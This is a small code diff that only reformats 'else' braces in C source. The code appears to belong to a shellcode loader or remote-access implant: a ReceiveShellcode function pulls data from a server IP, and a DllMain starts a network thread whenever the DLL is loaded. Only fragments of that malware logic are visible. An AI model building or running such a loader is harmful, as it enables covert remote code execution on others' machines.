@@ -257,8 +257,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     char serverIP[INET_ADDRSTRLEN] = { 0 };
     if (GetIPAddress(addr, serverIP, sizeof(serverIP)) == 0) {
         Mprintf("Resolved IP: %s\n", serverIP);
-    }
-    else {
+    } else {
         Mprintf("Failed to resolve '%s'.\n", addr);
         WSACleanup();
         return NULL;
@@ -329,8 +328,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
                     break;
                 }
             }
-        }
-        else {
+        } else {
             closesocket(clientSocket);
             break;
         }
@@ -446,8 +444,7 @@ BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
         param.Port = atoi(g_Server.szPort);
         param.User = g_Server.pwdHash;
         threadHandle = CreateThread(NULL, 0, run, &param, 0, NULL);
-    }
-    else if (fdwReason == DLL_PROCESS_DETACH) {
+    } else if (fdwReason == DLL_PROCESS_DETACH) {
         if (threadHandle) TerminateThread(threadHandle, 0x20250619);
     }
     return TRUE;
